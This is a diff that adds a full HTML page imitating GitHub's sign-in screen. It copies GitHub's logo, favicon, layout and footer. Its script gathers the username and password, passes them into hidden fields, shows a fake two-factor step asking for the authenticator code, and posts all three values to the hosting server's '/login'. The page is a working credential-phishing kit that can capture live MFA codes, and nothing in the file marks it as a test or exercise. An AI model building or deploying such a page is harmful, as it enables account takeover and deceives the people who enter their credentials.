@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to GitHub</title>
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: #f6f8fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container { width: 340px; max-width: 92%; }
+        .logo { text-align: center; margin: 20px 0; }
+        .logo svg { height: 48px; fill: #1f2328; }
+        .card {
+            background: #fff;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 300;
+            color: #1f2328;
+            text-align: center;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+        }
+        .form-group { margin-bottom: 14px; }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #1f2328;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #1f2328;
+            background: #f6f8fa;
+            outline: none;
+            line-height: 20px;
+        }
+        .form-group input:focus {
+            background: #fff;
+            border-color: #0969da;
+            box-shadow: 0 0 0 3px rgba(9,105,218,0.15);
+        }
+        .form-group input::placeholder { color: #8c959f; }
+        .forgot-link {
+            float: right;
+            font-size: 12px;
+            color: #0969da;
+            text-decoration: none;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+        .btn {
+            width: 100%;
+            padding: 8px 16px;
+            background: #2da44e;
+            color: #fff;
+            border: 1px solid rgba(27,31,36,0.15);
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+        .btn:hover { background: #2c974b; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error {
+            color: #cf222e;
+            font-size: 12px;
+            margin: 8px 0;
+            display: none;
+            background: #ffebe9;
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid rgba(255,129,130,0.4);
+        }
+        .loader { display: none; text-align: center; margin: 12px 0; }
+        .spinner {
+            width: 20px; height: 20px;
+            border: 2px solid #d0d7de;
+            border-top-color: #0969da;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .login-callout {
+            margin-top: 16px;
+            padding: 16px;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 14px;
+            color: #1f2328;
+        }
+        .login-callout a { color: #0969da; text-decoration: none; font-weight: 500; }
+        .login-callout a:hover { text-decoration: underline; }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #8c959f;
+        }
+        .footer a { color: #0969da; text-decoration: none; margin: 0 6px; }
+        .footer a:hover { text-decoration: underline; }
+        .mfa-section { display: none; }
+        .hidden { display: none; }
+        .passkey-section {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #8c959f;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        </div>
+        
+        <div class="card">
+            <h1>Sign in to GitHub</h1>
+            
+            <div id="errorMsg" class="error"></div>
+            <div class="loader" id="loader"><div class="spinner"></div></div>
+
+            <!-- Step 1: Username + Password -->
+            <div id="step1">
+                <form id="loginForm" onsubmit="return step1Submit()">
+                    <div class="form-group">
+                        <label for="login">Username or email address</label>
+                        <input type="text" id="login" name="login" placeholder="Enter your username or email" required autofocus>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password <a href="#" class="forgot-link">Forgot password?</a></label>
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    </div>
+                    <button type="submit" class="btn">Sign in</button>
+                </form>
+                <div class="passkey-section">
+                    <a href="#" style="font-size:12px;">Sign in with a passkey</a>
+                </div>
+            </div>
+
+            <!-- Step 2: 2FA -->
+            <div id="step2" class="hidden">
+                <p style="font-size:14px;color:#1f2328;margin-bottom:16px;">Two-factor authentication</p>
+                <p style="font-size:12px;color:#656d76;margin-bottom:16px;">Open your authenticator app and enter the 6-digit code.</p>
+                <form id="mfaForm" action="/login" method="POST" onsubmit="return finalSubmit()">
+                    <input type="hidden" id="hidden_login" name="login" value="">
+                    <input type="hidden" id="hidden_password" name="password" value="">
+                    <div class="form-group">
+                        <label for="otp">Authentication code</label>
+                        <input type="text" id="otp" name="otp" placeholder="XXXXXX" 
+                               style="font-size:20px;letter-spacing:4px;text-align:center;font-weight:500;" maxlength="6" autocomplete="off">
+                    </div>
+                    <button type="submit" class="btn">Verify</button>
+                </form>
+                <p style="text-align:center;margin-top:12px;font-size:12px;">
+                    <a href="#" style="color:#0969da;text-decoration:none;">Use a recovery code</a>
+                </p>
+            </div>
+        </div>
+
+        <div class="login-callout">
+            New to GitHub? <a href="#">Create an account</a>
+        </div>
+
+        <div class="footer">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+            <a href="#">Docs</a>
+            <a href="#">Contact GitHub Support</a>
+        </div>
+    </div>
+
+    <script>
+        function step1Submit() {
+            const login = document.getElementById('login').value.trim();
+            const password = document.getElementById('password').value.trim();
+            if (!login || !password) {
+                showError('Please enter both username and password.');
+                return false;
+            }
+            hideError();
+            
+            document.getElementById('hidden_login').value = login;
+            document.getElementById('hidden_password').value = password;
+            
+            // Show MFA step
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('step2').style.display = 'block';
+            setTimeout(() => document.getElementById('otp').focus(), 100);
+            return false;
+        }
+
+        function finalSubmit() {
+            document.getElementById('loader').style.display = 'block';
+            document.querySelector('#mfaForm .btn').disabled = true;
+            return true;
+        }
+
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.style.display = 'block';
+        }
+        function hideError() {
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
